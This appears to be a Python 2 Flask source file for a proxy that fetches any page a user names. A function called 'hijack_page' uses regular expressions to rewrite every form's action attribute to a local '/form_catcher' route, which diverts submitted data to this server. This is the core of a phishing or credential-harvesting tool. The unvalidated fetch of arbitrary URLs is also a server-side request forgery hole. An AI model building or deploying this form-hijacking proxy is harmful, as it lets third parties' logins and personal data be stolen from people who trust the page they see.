import re
import requests
from flask import Flask, render_template, url_for, request
from database import db_session
from models import User

app = Flask(__name__, static_path='/static', static_url_path='/static')

@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


@app.route("/")
def new_tab():
    print 'a'
    return render_template('new_tab.html')

@app.route("/fetch/", methods=["POST"])
def fetch_page():
    form = request.form
    targetURL = form['targetURL']
    r = requests.get(targetURL)
    text = r.text
    modified_text = hijack_page(text)
    return modified_text

def hijack_page(text):
    text = re.sub(r'action\=\".*\" ', 'action="/form_catcher" ', text)
    text = re.sub(r'action\=\".*\">', 'action="/form_catcher">', text)
    return text

if __name__ == "__main__":
    app.run(debug=True)
